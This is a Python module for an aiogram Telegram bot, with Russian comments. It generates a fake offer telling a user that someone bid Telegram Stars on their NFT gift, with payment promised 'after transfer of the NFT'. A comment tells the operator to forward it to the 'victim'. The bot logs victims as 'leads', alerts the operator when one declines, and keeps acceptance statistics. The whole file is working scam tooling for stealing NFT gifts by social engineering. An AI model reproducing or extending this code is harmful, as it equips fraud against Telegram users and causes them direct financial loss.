from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, ChatType

from config import OPERATOR_ID, GIFT_USERNAME, STARS_AMOUNT
from db import add_lead, get_stats
from keyboards import offer_keyboard

router = Router()

# Бот присылает ТЕБЕ готовый оффер для пересылки
@router.message(Command("get_offer"))
async def cmd_get_offer(message: Message):
    if message.from_user.id != OPERATOR_ID:
        return
    
    text = (
        f"💰 <b>Вам поступило предложение!</b>\n\n"
        f"На ваш NFT сделали предложение.\n"
        f"Вам предлагают <b>{STARS_AMOUNT} ⭐</b>.\n"
        f"🔗 <a href='https://t.me/nft/...'>Посмотреть подарок</a>\n\n"
        f"<i>Оплата зачислится после передачи NFT.</i>"
    )
    
    # Отправляем тебе. Ты нажимаешь "Переслать" и кидаешь жертве.
    await message.answer(
        text=text,
        reply_markup=offer_keyboard(OPERATOR_ID), # id тут роли не играет
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@router.message(Command("id"))
async def cmd_id(message: Message):
    await message.reply(f"Твой ID: <code>{message.from_user.id}</code>", parse_mode="HTML")

@router.message(Command("stats"))
async def cmd_stats(message: Message):
    if message.from_user.id != OPERATOR_ID:
        return
    total, accepted, declined = await get_stats()
    await message.reply(
        f"📊 <b>Статистика</b>\n"
        f"Всего лидов: {total}\n"
        f"Приняли: {accepted}\n"
        f"Отклонили: {declined}",
        parse_mode="HTML",
    )

@router.callback_query(F.data.startswith("offer:decline"))
async def on_offer_decline(call: CallbackQuery):
    _, choice, _ = call.data.split(":")
    u = call.from_user
    await add_lead(u.id, u.username or "", u.first_name or "", choice, "offered")

    text = "❌ <b>Оффер отклонён.</b>\n\nВы отклонили предложение."
    
    await call.message.edit_text(text, parse_mode="HTML")
    await call.answer()

    try:
        await call.bot.send_message(
            OPERATOR_ID,
            f"🎯 Лид (Отказ): @{u.username or '—'} (ID {u.id})",
            parse_mode="HTML",
        )
    except Exception:
        pass
